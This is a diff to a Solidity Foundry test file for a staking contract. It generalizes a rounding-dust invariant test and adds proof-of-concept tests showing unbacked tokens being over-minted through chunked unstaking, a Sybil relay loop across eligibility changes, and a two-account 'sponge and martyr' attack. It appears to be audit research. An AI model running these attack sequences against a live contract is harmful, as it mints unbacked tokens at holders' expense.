@@ -237,59 +237,53 @@ contract ProtocolStakingInvariantTest is Test {
 
     /// @dev Validates the maximum expected truncation dust (N - 1) for active users.
     function test_MaxNormalTruncationDust() public {
-        address alice = makeAddr("alice");
-        address bob = makeAddr("bob");
-        address charlie = makeAddr("charlie");
+        uint256 n = 20;
 
-        address[] memory users = new address[](3);
-        users[0] = alice;
-        users[1] = bob;
-        users[2] = charlie;
+        address[] memory users = new address[](n);
+        uint256[] memory amounts = new uint256[](n);
 
-        uint256[] memory amounts = new uint256[](3);
-        amounts[0] = 9;
-        amounts[1] = 9;
-        amounts[2] = 16;
+        for (uint256 i = 0; i < n; i++) {
+            users[i] = makeAddr(string(abi.encodePacked("user", vm.toString(i))));
+            amounts[i] = 1;
+        }
 
         ZamaERC20 token;
         ProtocolStakingHarness staking;
         (token, staking) = _setupIsolatedStaking(users, amounts);
 
         vm.startPrank(manager);
-        for (uint256 i = 0; i < users.length; i++) {
+        for (uint256 i = 0; i < n; i++) {
             staking.addEligibleAccount(users[i]);
         }
         vm.stopPrank();
 
-        // 1. Setup weights: Alice=3, Bob=3, Charlie=4. (Total Weight = 10)
-        vm.prank(alice);
-        staking.stake(9);
-        vm.prank(bob);
-        staking.stake(9);
-        vm.prank(charlie);
-        staking.stake(16);
+        // 1. Setup weights: Every user has weight 1. (Total Weight = 20)
+        for (uint256 i = 0; i < n; i++) {
+            vm.prank(users[i]);
+            staking.stake(1);
+        }
 
-        // 2. Generate exactly 29 wei of reward capacity.
+        // 2. Generate exactly 39 wei of reward capacity.
+        // Formula to maximize dust: RewardRate % TotalWeight == TotalWeight - 1
+        // 39 % 20 == 19
         vm.prank(manager);
-        staking.setRewardRate(29);
+        staking.setRewardRate(39);
         vm.warp(block.timestamp + 1);
         vm.prank(manager);
         staking.setRewardRate(0);
 
         // 3. Mathematical result:
-        //    Alice:   29 * 3 / 10 = 8.7 -> floors to 8 (loses 0.7)
-        //    Bob:     29 * 3 / 10 = 8.7 -> floors to 8 (loses 0.7)
-        //    Charlie: 29 * 4 / 10 = 11.6 -> floors to 11 (loses 0.6)
-        //    Total allocated = 27. Total pool = 29. Resulting dust = 2 (N - 1).
+        //    Each User: 39 * 1 / 20 = 1.95 -> floors to 1 (loses 0.95)
+        //    Total allocated = 20 * 1 = 20. Total pool = 39. Resulting dust = 19 (N - 1).
 
         // Evaluate invariant without any claims or unstakes
         int256 rhs = staking._harness_getTotalVirtualPaid() + SafeCast.toInt256(staking._harness_getHistoricalReward());
         int256 lhs = 0;
-        for (uint256 i = 0; i < users.length; i++) {
+        for (uint256 i = 0; i < n; i++) {
             lhs += staking._harness_getPaid(users[i]) + SafeCast.toInt256(staking.earned(users[i]));
         }
 
-        assertEq(rhs - lhs, 2, "Truncation dust exceeds N - 1 expectation");
+        assertEq(rhs - lhs, int256(n - 1), "Truncation dust exceeds N - 1 expectation");
     }
 
     /// @dev Dust Printing PoC: Demonstrates that downward rounding on exit abandons fractional dust
@@ -351,5 +345,256 @@ contract ProtocolStakingInvariantTest is Test {
 
         assertGt(totalMinted, authorizedRewards, "Protocol minted unbacked tokens");
         assertEq(totalMinted, 11, "Printer failed to extract exactly 1 wei over cap");
+    }
+
+    function test_BatchUnstakePrintsGlobalDust_18Decimals() public {
+        address alice = makeAddr("alice");
+        address bob = makeAddr("bob");
+
+        ZamaERC20 token;
+        ProtocolStakingHarness staking;
+
+        {
+            address[] memory users = new address[](2);
+            users[0] = alice;
+            users[1] = bob;
+
+            uint256[] memory amounts = new uint256[](2);
+            amounts[0] = 2999999998188649249; // ~sqrt(3e18)
+            amounts[1] = 999999999965065000000; // ~sqrt(1000e18)
+
+            (token, staking) = _setupIsolatedStaking(users, amounts);
+        }
+
+        vm.startPrank(manager);
+        staking.addEligibleAccount(alice);
+        staking.addEligibleAccount(bob);
+        vm.stopPrank();
+
+        vm.prank(alice);
+        staking.stake(2999999998188649249);
+        vm.prank(bob);
+        staking.stake(999999999965065000000);
+
+        uint256 initialTotalSupply = token.totalSupply();
+        uint256 expectedTotalRewards = 10_000 * 1e18 * 10;
+
+        vm.startPrank(manager);
+        staking.setRewardRate(10_000 * 1e18);
+        vm.warp(block.timestamp + 10);
+        staking.setRewardRate(0);
+        vm.stopPrank();
+
+        // Lock in positive debt before unstaking
+        vm.prank(bob);
+        staking.claimRewards(bob);
+
+        {
+            uint256 currentWeight = staking.weight(staking.balanceOf(bob));
+            uint256 weightStep = currentWeight / 20;
+
+            vm.startPrank(bob);
+            for (uint256 j = 0; j < 20; j++) {
+                uint256 nextWeight = currentWeight - weightStep;
+                uint256 amountToUnstake;
+
+                if (j == 19) {
+                    nextWeight = 0;
+                    amountToUnstake = staking.balanceOf(bob);
+                } else {
+                    amountToUnstake = (currentWeight * currentWeight) - (nextWeight * nextWeight);
+                }
+
+                staking.unstake(amountToUnstake);
+                currentWeight = nextWeight;
+            }
+            vm.stopPrank();
+        }
+
+        vm.prank(alice);
+        staking.claimRewards(alice);
+
+        int256 globalDrift = int256(token.totalSupply() - initialTotalSupply) - int256(expectedTotalRewards);
+
+        console.log("globalDrift", globalDrift);
+        console.log("expectedTotalRewards", expectedTotalRewards);
+        console.log("initialTotalSupply", initialTotalSupply);
+        console.log("token.totalSupply()", token.totalSupply());
+
+        assertGt(globalDrift, 0, "Protocol failed to over-mint unbacked dust");
+        assertLe(globalDrift, 20, "Over-minting exceeded the 1-wei-per-op bound");
+    }
+
+    /// @dev Demonstrates unbounded dust extraction
+    function test_SybilRelayDustPrinter_18Decimals() public {
+        uint256 WAD = 1e18;
+        uint256 relayCount = 20;
+
+        address[] memory users = new address[](relayCount);
+        uint256[] memory amounts = new uint256[](relayCount);
+
+        // Setup Chaotic Sybil Weights
+        for (uint256 i = 0; i < relayCount; i++) {
+            users[i] = address(uint160(uint256(keccak256(abi.encode("sybil", i)))));
+            amounts[i] = ((i * 13) + 7) * WAD;
+        }
+
+        ZamaERC20 token;
+        ProtocolStakingHarness staking;
+        (token, staking) = _setupIsolatedStaking(users, amounts);
+
+        // Initial State
+        for (uint256 i = 0; i < relayCount; i++) {
+            vm.prank(users[i]);
+            staking.stake(amounts[i]);
+        }
+
+        vm.prank(manager);
+        staking.addEligibleAccount(users[0]);
+
+        uint256 initialTotalSupply = token.totalSupply();
+
+        // Generate 10 tokens of reward capacity
+        uint256 rate = 1 * WAD;
+        uint256 duration = 10;
+        uint256 expectedTotalRewards = rate * duration;
+
+        vm.prank(manager);
+        staking.setRewardRate(rate);
+        vm.warp(block.timestamp + duration);
+        vm.prank(manager);
+        staking.setRewardRate(0);
+
+        vm.prank(users[0]);
+        staking.claimRewards(users[0]);
+
+        // The Extraction Loop
+        for (uint256 i = 0; i < relayCount - 1; i++) {
+            address currentSybil = users[i];
+            address nextSybil = users[i + 1];
+
+            // Pass the baton: Next enters, Current exits
+            vm.startPrank(manager);
+            staking.addEligibleAccount(nextSybil);
+            staking.removeEligibleAccount(currentSybil);
+            vm.stopPrank();
+
+            // NextSybil claims as the lone account, bypassing claim truncation (W/W = 1)
+            vm.prank(nextSybil);
+            staking.claimRewards(nextSybil);
+        }
+
+        // Measure the final physical drift
+        uint256 actualRewardsMinted = token.totalSupply() - initialTotalSupply;
+        int256 totalDrift = int256(actualRewardsMinted) - int256(expectedTotalRewards);
+
+        console.log("Expected Total Rewards: ", expectedTotalRewards);
+        console.log("Actual Rewards Minted:  ", actualRewardsMinted);
+        console.log("Total Unbacked Wei Printed: ", uint256(totalDrift));
+
+        // Final Assertions
+        assertGt(uint256(totalDrift), 0, "Failed to print dust");
+        assertGt(uint256(totalDrift), relayCount / 3, "Dust did not scale continuously");
+    }
+
+    function test_SpongeAndMartyr_NoManagerPrivileges() public {
+        address alice = makeAddr("alice"); // Honest User
+        address sponge = makeAddr("sponge"); // Attacker Account 1
+        address martyr = makeAddr("martyr"); // Attacker Account 2
+
+        ZamaERC20 token;
+        ProtocolStakingHarness staking;
+
+        // Isolate the setup arrays so they drop off the stack immediately
+        {
+            address[] memory users = new address[](3);
+            users[0] = alice;
+            users[1] = sponge;
+            users[2] = martyr;
+
+            uint256[] memory amounts = new uint256[](3);
+            amounts[0] = 3 * 1e18; // Alice Weight: sqrt(3e18)
+            amounts[1] = 1 * 1e18; // Sponge Weight: 1e9
+            amounts[2] = 1000 * 1e18; // Martyr Weight: sqrt(1000e18)
+
+            (token, staking) = _setupIsolatedStaking(users, amounts);
+        }
+
+        // Initial Setup
+        vm.prank(manager);
+        staking.addEligibleAccount(alice);
+        vm.prank(alice);
+        staking.stake(3 * 1e18);
+
+        vm.prank(manager);
+        staking.addEligibleAccount(sponge);
+        vm.prank(sponge);
+        staking.stake(1 * 1e18);
+
+        vm.prank(manager);
+        staking.addEligibleAccount(martyr);
+        vm.prank(martyr);
+        staking.stake(1000 * 1e18);
+
+        // Generate Rewards (Block Scoped)
+        {
+            vm.prank(manager);
+            staking.setRewardRate(10_000 * 1e18);
+            vm.warp(block.timestamp + 10);
+            vm.prank(manager);
+            staking.setRewardRate(0);
+        }
+
+        // Snapshot legitimate baselines before the attack
+        uint256 aliceExpected = staking.earned(alice);
+        uint256 spongeExpectedBaseline = staking.earned(sponge);
+
+        // The Attack Step 1: Martyr claims legitimate rewards first
+        vm.prank(martyr);
+        staking.claimRewards(martyr);
+
+        // The Attack Step 2: Martyr executes chunked unstake to print dust
+        uint256 currentWeight = staking.weight(1000 * 1e18);
+        uint256 weightStep = currentWeight / 10;
+
+        vm.startPrank(martyr);
+        for (uint256 j = 0; j < 10; j++) {
+            uint256 nextWeight = currentWeight - weightStep;
+
+            // On the final chunk, ensure weight zeroes out completely
+            if (j == 9) nextWeight = 0;
+
+            staking.unstake((currentWeight * currentWeight) - (nextWeight * nextWeight));
+            currentWeight = nextWeight;
+        }
+        vm.stopPrank();
+
+        // Measure Results
+        // Alice (Honest User) claims
+        vm.prank(alice);
+        staking.claimRewards(alice);
+
+        // Sponge (Attacker) claims
+        vm.prank(sponge);
+        staking.claimRewards(sponge);
+
+        console.log("--- The Results ---");
+
+        int256 aliceGain = int256(token.balanceOf(alice)) - int256(aliceExpected);
+        console.log("Alice (Honest) Unexpected Gain: %s wei", uint256(aliceGain));
+
+        int256 spongeGain = int256(token.balanceOf(sponge)) - int256(spongeExpectedBaseline);
+        if (spongeGain >= 0) {
+            console.log("Sponge (Attacker) Gain: +%s wei", uint256(spongeGain));
+        } else {
+            console.log("Sponge (Attacker) Loss: -%s wei", uint256(-spongeGain));
+        }
+
+        // Alice received free dust printed by the Martyr
+        assertGt(aliceGain, 0, "Alice should have received the abandoned dust");
+
+        // Attacker's Sponge failed to extract a meaningful amount
+        // because the claim truncation and proportional sharing swallowed it.
+        assertLe(spongeGain, 0, "Attacker should not profit from this vector");
     }
 }
